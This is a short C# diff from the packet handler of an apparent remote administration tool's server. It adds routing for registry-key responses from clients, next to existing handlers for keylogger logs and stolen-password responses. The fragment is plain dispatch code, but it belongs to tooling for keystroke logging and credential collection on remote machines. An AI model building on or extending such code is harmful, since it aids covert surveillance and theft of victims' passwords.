@@ -75,6 +75,10 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleGetKeyloggerLogsResponse(client, (ClientPackets.GetKeyloggerLogsResponse)packet);
             }
+            else if (type == typeof(ClientPackets.GetRegistryKeysResponse))
+            {
+                CommandHandler.HandleLoadRegistryKey((ClientPackets.GetRegistryKeysResponse)packet, client);
+            }
             else if (type == typeof(ClientPackets.GetPasswordsResponse))
             {
                 CommandHandler.HandleGetPasswordsResponse(client, (ClientPackets.GetPasswordsResponse)packet);
